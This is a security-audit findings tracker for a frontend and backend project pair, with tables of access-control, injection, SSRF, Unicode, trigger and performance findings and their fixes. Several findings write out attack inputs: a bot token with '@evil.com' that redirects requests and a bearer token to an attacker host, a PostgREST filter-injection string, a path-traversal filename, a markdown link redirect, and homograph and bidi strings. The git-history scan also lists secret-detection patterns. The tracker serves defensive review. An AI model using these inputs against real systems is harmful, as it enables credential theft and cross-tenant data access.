# Security Audit Loop — Findings Tracker

> Recurring security review of `Matraca130/numero1_sseki_2325_55` (frontend) and `Matraca130/axon-backend` (backend). Each iteration covers a different surface; findings ≥ medium are accumulated below to avoid duplicate reporting.

## Coverage map (what's been scanned, by surface)

| Iteration | Date | Repo | Surface | Status |
|---|---|---|---|---|
| 1 | 2026-04-16 | backend | RLS policies + general security scan (XSS, CSRF, injection, auth bypass) | ✓ done — 4 HIGH, 6 MED, 1 LOW |
| 2 | 2026-04-16 | frontend | XSS, CSRF, sensitive data exposure, dangerouslySetInnerHTML, postMessage, localStorage tokens | ✓ done — 1 MED |
| 3 | 2026-04-16 | backend | AI prompt injection (RAG context poisoning) + auth flow / JWT validation / role escalation | ✓ done — 3 HIGH, 6 MED |
| 4 | 2026-04-17 | both | CI/CD secrets exposure + GitHub Actions supply chain + npm deps audit | ✓ done — 1 HIGH, 6 MED, 3 LOW |
| 5 | 2026-04-17 | both | HTTP security headers + file upload validation | ✓ done — 3 HIGH, 4 MED |
| 6 | 2026-04-17 | backend | TOCTOU + advisory locks + non-AI rate-limit + PII logging | ✓ done — 2 HIGH, 7 MED, 1 LOW |
| 7 | 2026-04-17 | backend | CRUD factory input validation gaps + Realtime / WebSocket security | ✓ done — 0 HIGH, 6 MED, 3 LOW |
| 8 | 2026-04-17 | backend | Outbound notification flows (TG/WA send) — content injection, deep-link injection, recipient-targeting abuse | ✓ done — 0 HIGH, 2 MED |
| 9 | 2026-04-17 | both | Frontend artifact exposure + multi-role privilege boundary | ✓ done — 0 HIGH, 4 MED |
| 10 | 2026-04-17 | meta | Kill-chain analysis — composition of 63 findings into 7 attack chains + Pareto fix order | ✓ done — 2 CRITICAL chains, 4 HIGH chains, 1 MED chain |
| 11 | 2026-04-17 | both | Timing/side-channel + migration history + Supabase Auth config | ✓ done — 3 HIGH, 6 MED, 1 LOW |
| 12 | 2026-04-17 | backend | Stripe billing edge cases + first-active-membership codebase sweep | ✓ done — 9 HIGH, 5 MED |
| 13 | 2026-04-17 | meta | Updated kill-chain v2 (10 chains, 3 NEW + 4 UPDATED, Pareto re-sorted) | ✓ done |
| 14 | 2026-04-17 | both | CDN/HTTP-smuggling + cron/admin-debug + breakglass | ✓ done — 1 HIGH, 4 MED |
| 15 | 2026-04-17 | backend | SECURITY DEFINER RPC sweep (focused on iter 14 gap) | ✓ done — 1 HIGH (anon-exposed!), 3 MED write-IDOR |
| 16 | 2026-04-17 | both | Schema-wide grant audit + Storage signed URLs + bucket access | ✓ done — 2 CRITICAL, 2 HIGH, 3 MED |
| 17 | 2026-04-17 | backend | Re-audit iter 1 SAFE list (body-reading) + Deletion cascade + GDPR erasure | ✓ done — 8 HIGH, 4 MED, 2 LOW, 2 silent regressions, 6 phantom RPCs |
| 18 | 2026-04-17 | backend | Blind-spot tables (TS-inferred RLS) + CREATE OR REPLACE regression sweep | ✓ done — 2 CRITICAL + 3 HIGH actionable + 7+3 conditional + 3 regressions + 1 silent no-op |
| 19 | 2026-04-17 | backend | Trust-RLS-only sweep + Error payload leakage | ✓ done — 8 HIGH, 4 MED, 2 LOW (re-confirmations) |
| 20 | 2026-04-17 | both | SQL body audit of RPCs + XS-Leaks concrete scenarios | ✓ done — 1 CRITICAL (escalated), 1 HIGH (escalated), 4 MED, 1 LOW-MED |
| 21 | 2026-04-17 | both | Secrets management + Audit trail completeness | ✓ done — 1 CRITICAL (plaintext messaging tokens), 6 HIGH, 4 MED, 1 LOW |
| 22 | 2026-04-17 | both | Crypto primitives + Test code security | ✓ done — 0 HIGH, 4 MED, 2 LOW (first 0-HIGH iter since #8) |
| 23 | 2026-04-17 | both | Kill-chain v3 (10→15 chains, 5 NEW) + Webhook idempotency sweep (all 4 webhooks) | ✓ done — 3 HIGH, 5 MED + synthesis |
| 24 | 2026-04-17 | backend | Performance-as-security + DB trigger body audit | ✓ done — 0 HIGH, 4 MED, 1 LOW-batched (2nd 0-HIGH iter) |
| 25 | 2026-04-17 | both | Unicode + URL parsing ambiguity | ✓ done — 0 HIGH, 3 MED (3rd 0-HIGH iter) |
| 26 | 2026-04-17 | both | Prototype pollution + deep merge | ✓ done — **0 findings, 1st fully-clean iter** |
| 27 | 2026-04-17 | both | Git history secret scan + env template | ✓ done — **0 real findings, 2nd fully-clean iter** |

## Already-fixed surface (ground truth — do not re-flag)

- SECURITY DEFINER RPCs revoked from anon (#198, follow-up `20260417000001_security_revoke_overload_qualified.sql`)
- search_path pinned on public functions (#239, #243)
- 3 permissive `WITH CHECK (true)` policies tightened (#241)
- RLS enabled on 3 unused public tables (#240)
- Storage anon write removed from axonmed-images (#242, follow-up verification fix)
- Stripe webhook signature verified, payload type-guarded (#250)
- Rate-limit fail-closed (#239)
- Filename sanitize handles traversal/null bytes (#239)
- Error masking via safeErr wrapper (#239)
- DOMPurify rel tokens merged (#439)
- Login redirect open-redirect via backslash blocked (#447)

---

## Iteration 1 — 2026-04-16 — Backend RLS + security scan

**Status:** ✓ complete (security-scanner + rls-auditor)

### Backend security scan (security-scanner)

| # | Severity | Category | File:line | Issue | Fix |
|---|---|---|---|---|---|
| 1 | HIGH | A01 Broken Access Control / Confused-deputy | `routes/settings/messaging-admin.ts:39-50, 134-208` | `getUserInstitution()` returns the **first** owner/admin membership for the caller; `PUT/POST/GET /settings/messaging/:channel` accept no `institution_id`. Multi-institution admins can't pick which inst to administer; ordering bug could leak/overwrite WhatsApp/Telegram credentials of the wrong inst. | Require `institution_id` in path/body, validate UUID, then `requireInstitutionRole(db, user.id, instId, MANAGEMENT_ROLES)`. |
| 2 | HIGH | A10 SSRF (admin-gated) | `routes/settings/messaging-admin.ts:261-263, 285-288` | `bot_token` and `phone_number_id` interpolated raw into URL paths (`https://api.telegram.org/bot${bot_token}/getMe`, `https://graph.facebook.com/v21.0/${phone_number_id}`). Token containing `@evil.com/x?` shifts host (URL parser treats `@` as userinfo separator); WhatsApp call also leaks `Authorization: Bearer ${access_token}` to attacker host. | Validate `bot_token` against `^\d+:[A-Za-z0-9_-]+$` and `phone_number_id` against `^\d+$`. After URL construction assert `.host === "api.telegram.org"` / `"graph.facebook.com"`. |
| 3 | MEDIUM | A03 Injection (PostgREST filter) | `routes/content/keyword-connections.ts:104-119` | `keywordId = c.req.query("keyword_id")` not validated as UUID before `.or(`keyword_a_id.eq.${keywordId},...`)`. Value like `abc),id.not.is.null` injects extra filter terms. Bounded by RLS scope but still injection. | `if (!isUuid(keywordId)) return err(c, "...", 400);` (already imported in package). |
| 4 | MEDIUM | A08 Mass-assignment | `routes/settings/messaging-admin.ts:149-194` | `body.settings` cast to `ChannelSettings` (only 2 known keys checked), then `mergedSettings = { ...existing, ...settings }` upserted to jsonb. Admin can persist arbitrary keys (downstream code paths, GET response exfil, unbounded row growth). | Per-channel allow-list of keys; copy only those into mergedSettings; reject unknown with 400. |
| 5 | LOW | A01 Defense-in-depth | `routes-storage.ts:214-222, 241-246, 281-289` | Ownership check uses `p.includes('/${user.id}/')` (substring) instead of prefix match. Today Supabase doesn't resolve `..`, but any future bucket layout change could silently break isolation. | `if (!VALID_FOLDERS.some(f => p.startsWith(`${f}/${user.id}/`))) reject;` |

### Already-fixed verified
Stripe webhook HMAC-before-parse, rate-limit fail-closed (`ai-realtime:`), filename server-generated, `safeErr` consistent, Mux/WhatsApp/Telegram webhooks all parse-after-verify, no `fetch(userInput)` in `routes/ai/`, CORS allowlist tight in `index.ts:50-66`.

### Scope notes
- ANON_KEY in `docs/figma-make/*.md` and `tests/unit/rate-limit.test.ts` fixtures = public by design.
- Mux `cors_origin: "*"` (`routes/mux/api.ts:65`) on single-use upload URL — acceptable, optional tightening.
- `realtime-session.ts:410` logs `JSON.stringify(session).slice(0, 300)` only on failure branch — token leakage unlikely.
- No hardcoded secrets, no SQL string concatenation, no `body.user_id` auth-bypass routes found.

### RLS audit (rls-auditor)

| # | Severity | File:line | Issue | Fix |
|---|---|---|---|---|
| 1 | HIGH | `migrations/20260319000006_rls_admin_tables.sql:309-319` | `institution_subscriptions` INSERT/UPDATE/DELETE policies allow **any active member** (incl. students). Billing rows (Stripe sub state, plan_id) writable by students at DB layer. App-layer guard exists in `routes/billing/*` (admin client) but `routes/plans/access.ts:110` does `db.from("institution_subscriptions").update({status:"expired"})` via user client; `routes/plans/crud.ts:39` registers it through generic factory enforcing only `CONTENT_WRITE_ROLES`. | Drop `inst_subs_members_insert/update/delete`. Add owner/admin role-discriminating policies, OR force all writes through `adminDb`. |
| 2 | MEDIUM | `migrations/20260319000006_rls_admin_tables.sql:121-159, 244-298` | Defense-in-depth missing: `inst_members_update`, `memberships_institution_update/delete`, `inst_plans_members_*`, `plan_rules_members_*`, `kw_prof_notes_members_*`, `ai_reports_institution_update` permit any active member regardless of role. App layer enforces correctly today, but RLS would not stop a student calling Supabase JS directly. | Add `AND EXISTS(... role IN ('owner','admin'[,'professor']))` to USING/WITH_CHECK; mirror `pdf_sources_*_policy` pattern in `20260310000001`. |
| 3 | MEDIUM | `routes/content/{infographic-images,flashcard-images}.ts` (e.g. `infographic-images.ts:145, 247`) | References `image_generation_log` table that is **never created or RLS-enabled** in any migration in checkout (only `ALTER TABLE ... ADD COLUMN image_type` exists). Likely created via Supabase dashboard. | Add a tracked migration that re-asserts `ENABLE ROW LEVEL SECURITY` + service-only policy so schema is reproducible. |
| 4 | MEDIUM | `migrations/20260319000005_rls_user_tables.sql:344-345` | `student_xp_institution_select` exposes every member's XP to every other member via `institution_id = ANY(public.user_institution_ids())`. No role gate — student can read teacher/admin XP. May be intentional (leaderboard), but asymmetric vs `xp_transactions` SELECT (own-only). | If leaderboard is for student peers only, add `AND EXISTS(memberships m WHERE m.user_id=student_xp.student_id AND m.role='student')`. Otherwise document as intentional. |

### RLS-audit verifications & notes
- SECURITY DEFINER hardening: all RPCs use `SECURITY DEFINER` with locked `search_path`. Note: `20260417000001_security_revoke_overload_qualified.sql` (the follow-up I created on PR #198 branch) is **not present in main** — only on `task/AXO-138` branch awaiting merge.
- `WITH CHECK` omitted on `FOR UPDATE` is NOT a bug (Postgres reuses USING). Initial scan flagged ~15 such policies as systemic asymmetry; correctly withdrawn before reporting.
- `weekly_reports` SELECT-own + INSERT-own + no UPDATE/DELETE policies = intentional immutable-snapshot default-deny.
- `finals_periods.manage_finals_periods` correctly role-checked.
- No `bucket_id IS NOT NULL`-style overly broad storage quals.
- SECURITY INVOKER public functions returning rows: deferred to iteration 2 (preliminary grep found no `SECURITY INVOKER` declarations; `LANGUAGE sql` defaults to INVOKER and inherits caller RLS, but deserves deeper sweep).

## Iteration 8 — 2026-04-17 — Outbound notification flows

**Status:** ✓ complete

### Outbound notifications (security-scanner)

| # | Severity | Channel | File:line | Issue | Fix |
|---|---|---|---|---|---|
| 1 | DUPLICATE | Telegram/WA | (already iter 1 #2) | SSRF via stored bot_token / phone_number_id — agent re-flagged. Same finding as iter 1; not re-counted. | (see iter 1) |
| 2 | MEDIUM | Telegram | `routes/telegram/link.ts:53, 218-226` | Linking-session collision via 32-bit `hashCode`. Temp linking row keyed by `chat_id = -Math.abs(hashCode(user.id))` with `onConflict: chat_id` upsert. Two users with colliding UUID hashes overwrite each other's pending 6-digit code (5-min window). Birthday-attack space ~2^16; attacker registering many accounts can flush a victim's pending link state. **Distinct from iter 3 #1 (chat_id binding)** — that was about the 6-digit code being submittable from any chat; this is about the linking-row storage key collision. | Replace with `crypto.randomUUID()`-derived sentinel or use a separate `linking_codes` table keyed by `user_id`. |
| 3 | MEDIUM | Telegram | `routes/telegram/tg-client.ts:86-96` | Latent MarkdownV2 injection footgun. `sendText()` defaults to `parse_mode: "Markdown"` and slices to 4096 with no escaping. Currently no callers (only `sendTextPlain` and `sendWithInlineKeyboard("","")` used). Any future call passing AI/user content (e.g. `summary.title`, transcribed audio) → parser errors at best, formatting injection / `[link](http://evil)` redirect at worst. | Remove the export, OR force `parseMode` to non-default required arg, OR add `escapeMarkdown()` and call inside `sendText`. Add lint rule blocking imports until escaping in place. |

### Outbound verified clean
- Inline keyboard `callback_data` is server-generated enum (`review_fail|review_good|review_easy`) and validated on receipt against `BUTTON_TO_RATING` lookup. Arbitrary callback strings cannot trigger DB writes.
- **No URL buttons / `InlineKeyboardButton.url`** ever set — only `callback_data`. No phishing-redirect surface.
- **No broadcast / fan-out / professor-to-students endpoint exists.** All bot output is reactive to incoming webhook (`webhook.ts` → `handler.ts`). No bulk-send route, no recipient-array endpoint, no cron pushing notifications.
- No `wa.me?text=` deep-link generation. `getBotUrl()` reads env var only.
- WA template `sendTemplate()` exists but **not called anywhere** — no variable-substitution surface today.
- Admin-only endpoints (`/telegram/setup-webhook`, `/telegram/delete-webhook`, `/whatsapp/process-queue`, `/telegram/process-queue`) gated by `timingSafeEqual(token, SUPABASE_SERVICE_ROLE_KEY)`.
- Webhook secret/HMAC `timingSafeEqual` on both channels; misconfigured-secret fails closed.
- Per-chat outbound rate-limit (30/min linked, 10/min unlinked) protects against spam abuse.
- Outbound message bodies NOT persisted: log stores metadata only (id, type, direction, success, latency). No PII in body fields. Console logs truncate text to 80 chars + mask phone/linking codes.
- `is_active=false` toggled on unlink — webhook lookup filters `is_active=true`, so unsubscribed users stop receiving bot replies (implicit opt-out, no proactive push exists).

### Outbound notes
- Recipient targeting: bot replies always go back to originating `chat_id`/`phone` resolved server-side from `telegram_links`/`whatsapp_links`. No endpoint accepts target `student_id` from caller. Cross-user targeting is structurally impossible.
- Async-queue jobs (`whatsapp_jobs`): payload set server-side from verified inbound webhook context. CAS pattern (`status=pending → processing`) prevents double-send.
- AI-generated content flows into `sendTextPlain` (no parse_mode). `*bold*` / `[link](url)` syntax renders literally. Safe.
- **Future risk to track**: if email channel is added, ensure HTML-mode sends sanitize AI/user content (DOMPurify-equivalent server-side) and any `mailto:`/unsubscribe link uses HMAC-signed tokens.

### Iter 8 totals
- **0 HIGH**
- **2 MEDIUM** new (linking collision, latent MD injection); 1 DUPLICATE of iter 1 not re-counted
- **0 LOW**

---

## Iteration 9 — 2026-04-17 — Frontend artifact + multi-role privilege

**Status:** ✓ complete (frontend artifact + multi-role)

### Frontend artifact / runtime exposure (security-scanner)

| # | Severity | Layer | File:line | Issue | Fix |
|---|---|---|---|---|---|
| 1 | MEDIUM | A05 Misconfig | `public/opus-lab.html` (1947 lines, whole file) | Internal "Opus Prompt Lab v2" debug/marketing HTML bundled into `dist/opus-lab.html`, publicly reachable at `https://<host>/opus-lab.html`. Vercel/Cloudflare serve `/public/*` before SPA rewrite — orphan asset bypasses React router. Leaks: (a) existence of internal prompt-engineering audit tool, (b) verbatim 9-finding "audit report" with internal critique, (c) Anthropic Claude 4.x prompt templates used by team (~1700 lines internal IP). Inline `<script>` blocked by CSP `script-src 'self'` (no active XSS). No secrets/tokens inside (verified). | Move out of `public/` (e.g. into `docs/` or private gist), or add Vercel header rule denying `/opus-lab.html`. Confirm `dist/` rebuild no longer ships it. |

### Frontend artifact verified clean
- **Source maps**: `vite.config.ts` no `build.sourcemap` override (Vite default = false in prod). `dist/assets/` has 0 `*.map` files; no `sourceMappingURL` references in `dist/` JS. Original sources NOT exposed.
- **Vite `define:` block**: no `define` key in `vite.config.ts`. No env vars statically substituted.
- **Env vars**: only `import.meta.env.DEV/PROD/VITE_AXON_TODAY` referenced. All non-Vite-prefixed absent. `process.env.X` returns 0 matches.
- **IndexedDB / persistent storage**: 0 `indexedDB.open` / `localforage` / `idb-keyval` usage. Only `localStorage` with documented `axon_*` prefix + non-credential app-state keys.
- **Service worker / PWA**: no `vite-plugin-pwa`, `workbox`, `serviceWorker.register`. SW does NOT intercept API responses.
- **Third-party `<script>`**: 0 in `index.html` other than Vite's own `/src/main.tsx` module. No PostHog/Mixpanel/GA/Sentry/LaunchDarkly/hCaptcha/Turnstile.
- **CSP `script-src 'self'`** confirmed (no `'unsafe-inline'` for scripts).
- **Image referrer leak**: `Referrer-Policy: strict-origin-when-cross-origin` re-confirmed; no `<img>` overrides.
- **WebAssembly**: 0 `WebAssembly.instantiate`/`compile` matches.
- **`URL.createObjectURL`**: all 8 uses are outbound Blob downloads (CSV/JSON exports, image previews from local `File`). None render `<a href={blobUrl}>` with attacker-controlled blob.
- **Hydration leaks**: no `__INITIAL_STATE__`/`__PRELOADED_STATE__` patterns.
- **Dynamic `<meta>` injection**: no `react-helmet` / runtime `document.title = userInput`.
- **Hardcoded internal URLs**: 0 `localhost`/`127.0.0.1`/`admin-only`/`debug-only` strings in `src/`. Supabase project URL is documented public ANON endpoint.

### Frontend artifact notes
- **Google Fonts (LOW GDPR)**: `index.html:8-13` + `typography.ts:29-30` load Inter + Lora from `fonts.googleapis.com`/`gstatic.com`. EU IP shared with Google on first paint → Schrems-II concern. Mitigation: self-host woff2 in `/public/fonts/`. Defer to product/legal.
- **Iframe + `pdfUrl` (iter 5)**: re-confirmed; CSP `frame-src 'none'` actively blocks all iframe rendering → PDF preview dead in production. UX bug, not security defect. Not re-flagged.

### Multi-role privilege (security-scanner)

| # | Severity | Endpoint/RPC | File:line | Issue | Fix |
|---|---|---|---|---|---|
| 1 | MEDIUM | `GET /gamification/leaderboard` (+ all XP write paths) | `routes/gamification/profile.ts:131-152`; `xp-engine.ts:201-258`; migration `20260319000011_award_xp_rpc.sql:43-117` | `student_xp` rows are created by **role-agnostic** paths: `awardXP()` and `award_xp` RPC upsert keyed only on `(student_id, institution_id)`. Endpoints `/goals/complete`, `/daily-check-in`, `/check-badges`, `/onboarding`, `/streak-freeze/buy`, `/streak-repair`, `PUT /daily-goal`, plus all hooks in `xp-hooks.ts`, gate caller with `requireInstitutionRole(ALL_ROLES)` — owner/admin/professor pass and produce `student_xp` rows. Leaderboard filters only by `institution_id` → **professor and admin XP appear in public student leaderboard**. Cross-role exposure: institution professor clicking "Daily check-in" leaks position+XP+level to every student. | (a) Add `WHERE EXISTS (SELECT 1 FROM memberships m WHERE m.user_id = student_xp.student_id AND m.institution_id = ... AND m.role = 'student' AND m.is_active)` to leaderboard queries (both `weekly` and `daily`), OR (b) gate inside `award_xp` RPC: `IF NOT EXISTS(... role='student' ...) THEN RETURN;`. Preferred: (b) fixes leak at source. |
| 2 | MEDIUM | `GET /search`, `GET /trash` (RPCs `search_scoped`, `trash_scoped`) | migration `20260304000003:91-99,266-269`; `20260319000015:42-46` | Both SQL functions resolve `user_institutions` as `WHERE m.user_id = auth.uid() AND m.is_active = true` (no role filter, no per-request inst scoping). For user with memberships in inst A *and* B, every `/search?q=...` and `/trash` call merges results from BOTH institutions into single response with no `institution_id` discriminator. Endpoint never accepts `?institution_id=` filter and RPC ignores it. Student-in-A who joined a public/demo inst B sees inst-B titles/snippets in same result list as inst-A, cannot tell which is which. | Add `p_institution_id UUID DEFAULT NULL` parameter; when present restrict CTE to that single id (still verifying membership). Update routes to forward param; or augment row with `institution_id` so callers can self-filter. |
| 3 | MEDIUM | `POST /ai/chat`, `POST /ai/realtime-session` | `routes/ai/chat.ts:188-195`; `routes/ai/realtime-session.ts:217-225` | Same "first active membership" anti-pattern as iter 1 #1 (messaging-admin), now in AI handlers. When client doesn't pass `summary_id`/`topic_id`/`institution_id`, both fall back to `db.from("memberships").select(...).limit(1).single()` with **no `ORDER BY`** → arbitrary inst pick. Result: AI conversation, RAG context, audit logs, voice rate-limit bucket, and `requireInstitutionRole` check all bind to a *different* institution than user expected. For `student` in A + `professor` in B, AI usage on B's content may be billed/logged against A. | Require explicit `institution_id` in body (return 400 if missing); OR persist a "current institution" in user profile and read from there. Do NOT fall back to first membership. |

### Multi-role verified clean
- **JWT revocation / role transitions**: `db.ts:121-148` only verifies signature/exp/aud; `auth-helpers.ts:156-185` re-queries `memberships` with `is_active=true` per request. Role demotion / `is_active=false` takes effect on next call regardless of JWT TTL. No JWT custom-role claims used.
- **`PUT /me` mass-assignment**: `routes-auth.ts:231-244` explicit `allowedFields = ["full_name", "avatar_url"]`. `role`/`is_active`/`institution_id`/`email` cannot be set.
- **Membership hierarchy**: `routes/members/memberships.ts:166-213` enforces `callerLevel >= targetLevel` for role change/deactivation + last-owner protection.
- **`prof-notes.ts`** upserts use `professor_id: user.id` server-side, not from JWT/body — no role-spoofed writes.
- **Inactive memberships**: `routes/members/institutions.ts:97-99` and `auth-helpers.ts:170` both filter `is_active=true`. `user_institution_ids()` (migration 20260319000003) also filters → RLS scope shrinks instantly on deactivation.
- **`GET /me`**: returns own `profiles` row only — does not embed memberships.

### Multi-role notes
- **Iter 1 #1 still present** (messaging-admin first-membership) — same fix as 9-3 applies.
- **Iter 3 auth #4** (`_messaging/tools-base` `student_id`-only filtering) not re-examined this iteration; thread remains open.
- **Finding 9-1 root cause** is upstream of leaderboard — same role-agnostic XP write also pollutes `xp_transactions`, `student_badges` (badges.ts:262-268 same gap), and `streak_freezes`. Fix at `award_xp` RPC closes them all.
- No "transfer ownership" endpoint exists.
- No SECURITY DEFINER function returns rows from multiple institutions to non-management callers.

### Iter 9 totals
- **0 HIGH**
- **4 MEDIUM** (opus-lab.html exposure, leaderboard XP cross-role, search/trash inst merge, AI chat first-membership)

---

## Iteration 27 — 2026-04-17 — Git history secret scan + env template

**Status:** ✓ complete — **0 real findings**

### Git history secret scan

Scanned all git history in both repos for patterns:
- `sk_live_`, `whsec_`, `AIza...{35}`, `ghp_`, `github_pat_`, `AKIA...`, `xoxb-/xoxp-/xoxa-/xoxr-`, `sk-...{20}`, `sk-ant-...{20}`, PEM private key blocks.

**Results**:
- Backend: 1 hit `FAKE_WEBHOOK_SECRET = "whsec_<REDACTED>_secret_key_12345"` (obvious fake/test). PEM blocks are template strings for env-supplied keys (NO real keys committed).
- Frontend: 0 hits.

**No real secrets ever committed.**

### Env template check
- No `.env.example` / `.env.sample` / `.env.template` in either repo. Minor onboarding gap (new devs don't know required env vars). NOT a security finding.

### Iter 27 totals
- **0 findings** (2nd consecutive fully-clean iter)

**Acumulado tras iter 27: 6 CRITICAL + 65 HIGH + 99 MED + 18 LOW = 188 findings** (unchanged)

---

## Iteration 26 — 2026-04-17 — Prototype pollution + deep merge

**Status:** ✓ complete — **0 findings**

Mass-assignment surface well-contained across codebase via consistent `validateFields` / `createFields[]` / `updateFields[]` / hardcoded-`allowedFields` pattern. Spread operator `{...x}` uses ES-spec `CopyDataProperties` which does NOT invoke `__proto__` setter — no exploitable pollution via spread anywhere.

### Verified clean (full list)
- `Object.assign(target, fields)` in `routes/plans/{diagnostics,ai-generations}.ts`: `fields` comes from `validateFields()` which iterates hardcoded rules. Raw `body` never reached.
- `crud-factory.ts` createFields/updateFields: explicit whitelist iteration.
- `algorithm-config.ts:130-135`: `for (const field of allowedFields)` hardcoded list.
- `wa-client.ts:89-92`: server-constructed body, not user-controlled keys.
- All frontend computed-key spreads use UUID/internal identifiers, not free-text input.
- JSON.parse sites: no recursive traversal, no reviver, no deep merge.
- **Zero `lodash.merge` / `lodash.defaultsDeep` / custom `deepMerge`** in `backend/` or `frontend/src/`.
- Zero Zustand/Redux stores with user-keyed action payloads.

### Notes
- `messaging-admin.ts:184-187` `{...existing, ...settings}` spread: iter 7 #5 concern was JSONB bloat not pollution. ES spec `CopyDataProperties` makes `__proto__` a literal own property, not prototype mutation. Not exploitable.
- Mass-assignment attack surface: clean overall. Recommend keep the convention enforced.

### Iter 26 totals
- **0 HIGH, 0 MED, 0 LOW** (first fully-clean iter in the audit)

**Acumulado tras iter 26: 6 CRITICAL + 65 HIGH + 99 MED + 18 LOW = 188 findings** (unchanged)

---

## Iteration 25 — 2026-04-17 — Unicode + URL parsing ambiguity

**Status:** ✓ complete

### Unicode homograph + URL parsing (security-scanner)

| # | Severity | Vector | File:line | Issue | Fix |
|---|---|---|---|---|---|
| 1 | MEDIUM | Unicode homograph / normalization in email + display names | `validate.ts:47-48` + `routes-auth.ts:71-100` | `isEmail` applies no NFC/NFKC, no ASCII/punycode check. Signup accepts `m\u0430traca@gmail.com` (Cyrillic `а`) distinct from `matraca@gmail.com`. Downstream `profiles.email` stored raw; lookups compare as different → visual account impersonation + phishing in admin dashboards. Same for `full_name`, institutions.name, titles. | Before `createUser`, `email.normalize('NFKC').toLowerCase()`; reject if local-part has non-ASCII mixed scripts (UTS #39 confusables). Normalize display-name at write. |
| 2 | MEDIUM | Path injection via unsanitized file extension | `routes-storage.ts:99,138,151,154` | `originalName` from `file.name` or `body.fileName` with NO sanitization. `ext = originalName.split(".").pop()` interpolated into `storagePath`. Filename `x.png/../../other-user/owned` or RLO/null-byte/`..%2F` lands in bucket path. Sibling `routes-models.ts:323-326` DOES sanitize → fix known, inconsistency. | Apply same sanitization: `ext.toLowerCase().replace(/[^a-z0-9]/g, "").slice(0,8)`; validate against MIME allowlist. |
| 3 | MEDIUM | Unicode bidi / null-byte passthrough in stored display strings | `routes/members/institutions.ts:48-57`, `routes-auth.ts:121`, `routes/ai/ingest-pdf.ts:144-166` | `isNonEmpty` accepts U+202E (RLO), U+200F (RLM), U+0000 (null — NOT stripped by `sanitizeForPrompt` since that's LLM-only). `full_name = "Alice\u202Egnp.exe"` renders as `Alice exe.png` in admin lists; institution name `"Go\u043Fgle"` impersonates. | `sanitizeDisplayString()`: NFKC-normalize, strip C0/C1 controls + bidi/format (`\u200B-\u200F\u202A-\u202E\u2066-\u2069\uFEFF`), reject null bytes, cap length. |

### Unicode verified clean
- `new URL(c.req.url)` sites operate on request URL or env `SUPABASE_URL` — no user-controlled URL parsed into fetch host.
- `fetch(url)` sites in AI provider clients: URLs from env constants, no user input.
- `stylePackUrls` fetch: grep found 0 write endpoints → DBA-managed or unused table.
- `quiz-helpers.ts:14` uses `.normalize('NFD')` for diacritic-insensitive answer grading — documented UX, not exploitable.
- Turkish-`i` / German-`ß` case-folding: no locale-aware `toUpperCase`/`toLowerCase` — correct for identifier comparison.

### Unicode notes
- Combining-character DoS against `full_name` / institution name — single char + 2000 diacritics renders arbitrarily tall. Cap display length at write.
- Finding #2 is sibling of iter 5 ingest-pdf but different code path (JSON body vector, no inst sandboxing) — genuinely novel.

### Iter 25 totals
- **0 HIGH** (3rd 0-HIGH iter confirming ROI saturation)
- **3 MEDIUM** (homograph email, ext injection, bidi/null passthrough)

**Acumulado tras iter 25: 6 CRITICAL + 65 HIGH + 99 MED + 18 LOW = 188 findings**

---

## Iteration 24 — 2026-04-17 — Performance-as-security + DB trigger body audit

**Status:** ✓ complete (trigger body + performance)

### DB trigger body audit (security-scanner)

| # | Severity | Trigger | Migration:line | Issue | Fix |
|---|---|---|---|---|---|
| 1 | MEDIUM | `sync_summary_institution_id` | `20260304000007:37-48` + duplicated at `20260307000001:60-71` | SECURITY DEFINER-by-ownership, fires `BEFORE INSERT OR UPDATE OF topic_id` on `summaries` (hot path). **No `SET search_path`**. Body references unqualified `topics`/`sections`/`semesters`/`courses`. Attacker with CREATE privilege on any schema earlier in caller's search_path could shadow these with fake table returning arbitrary `institution_id` → silently re-tenant every summary write → cross-tenant data leak via RAG institution filter. Same class as iter 18 `resolve_parent_institution` pg_temp regression. | Add `SET search_path = public` to `CREATE OR REPLACE FUNCTION` (and/or schema-qualify: `public.topics`, etc.). Apply to BOTH migration files or supersede with idempotent patch. |
| 2 | LOW (batched) | 6× `updated_at` triggers: `update_video_views_updated_at`, `update_ai_content_reports_updated_at`, `update_whatsapp_sessions_updated_at`, `update_telegram_sessions_updated_at`, `update_messaging_admin_settings_updated_at`, `set_updated_at` | various migrations | Same missing `SET search_path`. Bodies only call `now()` (not schema-shadowable) → exploit surface near-zero but **violates project baseline**. | Add `SET search_path = pg_catalog, public`. Batch in single hardening migration. |

### Trigger body verified clean
- **Infinite recursion**: `sync_summary_institution_id` is BEFORE, only mutates `NEW.institution_id`. Dashboard triggers write to other tables, not back.
- **External side effects**: NO trigger body invokes `pg_net.http_post`. All `net.http_post` calls live in cron wrappers.
- **`auth.uid()` in triggers**: NOT referenced in any of 9 trigger functions — no service-role/cron NULL-uid breakage.
- **Lock order / deadlock**: `on_review_inserted` + `on_study_session_completed` both write `daily_activities` then `student_stats` consistently.
- **Hot-table blocking**: Dashboard triggers wrap work in `EXCEPTION WHEN OTHERS THEN RAISE WARNING; RETURN NEW` — deliberate trade-off (iter 20 noted).
- **Trigger bypass via RETURNING**: NO BEFORE INSERT sanitization triggers exist.

### Trigger body notes
- Duplicate trigger: `trg_summary_institution_sync` in both `20260304000007` + `20260307000001`. Both idempotent but two sources of truth — any search_path fix must apply to both.
- Streak race in `on_study_session_completed` (`SELECT ... INTO v_new_streak` then UPSERT without row lock): correctness bug, not OWASP-class.

### Performance-as-security (security-scanner)

| # | Severity | Pattern | File:line | Issue | Fix |
|---|---|---|---|---|---|
| 1 | MEDIUM | Slow webhook sync processing | `routes/telegram/webhook.ts:333-340` + `routes/whatsapp/webhook.ts:365-374` | Webhook handlers `await handleMessage(...)` before returning 200. Agentic Claude loop runs up to `MAX_AGENTIC_ITERATIONS` (~5) × 2-3s each = 6-30s inline. Meta retries WA after ~20s / TG after ~60s on timeout → duplicate LLM billing (dedup stops DB writes, but Claude cost already burned). Only `generate_content`/`generate_weekly_report` enqueued; `get_study_queue`, search, `rag_chat` tools run inline. **Attacker-triggered per message**. | Enqueue whole agentic loop via `whatsapp_jobs`, return 200 immediately; response via `sendText*` from worker. Pattern exists for `generate_content`. |
